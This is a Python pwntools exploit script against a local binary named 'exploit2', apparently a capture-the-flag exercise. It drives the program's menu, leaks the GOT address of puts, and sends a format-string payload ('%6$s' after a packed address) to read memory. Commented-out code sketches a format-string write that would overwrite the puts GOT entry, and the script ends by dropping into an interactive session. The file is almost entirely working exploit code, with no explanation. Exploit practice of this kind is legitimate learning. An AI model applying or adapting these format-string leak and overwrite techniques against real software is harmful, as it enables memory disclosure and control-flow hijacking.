from pwn import *

putsGot = 0x0804a024
nums = ['1215069295', '1311962008', '1086128678', '385788725']
# context.log_level = 'debug'
p = process('./exploit2')

def menu():
    p.recvuntil('4 - exit')
    p.recvline()
    p.recvline()
    p.recvline()

def setName(size, name):
    p.sendline('1')
    p.recvline()
    p.recvline()
    p.sendline(str(size))
    p.recvline()
    p.recvline()
    p.sendline(name)
    menu()

menu()
setName(0x3f, 'not null')
p.sendline('3')
p.recvuntil('format')
pause()
p.send(p32(0xdeadbeef))
p.recvuntil('info')
q = p.recvline()
# log.info(q)
putsGOT = int(p.recv(10),16)
log.info(hex(putsGOT))
menu()
p.sendline('2')
p.recvline()
p.sendline(nums[0])
p.recvline()
# p.sendline('bye')
p.sendline(p32(putsGot)+'%6$s')
p.recvuntil('?')
q = p.recvline()
print repr(q)
q = p.recvline()
print repr(q)
menu()
setName(0x3f, 'not null')
setName(50, '\0')
# pause()
# setName(60, 'not null')
# setName(50, '\0')


# p.sendline('AAAA'+('%6$x'))

# def pay(q):
#     p.sendline(q)
#     log.info(repr(q))
# form = FmtStr(execute_fmt=pay, offset=6)
# form.write(putsGOT, 0x41414141)
# form.execute_writes()


p.interactive()
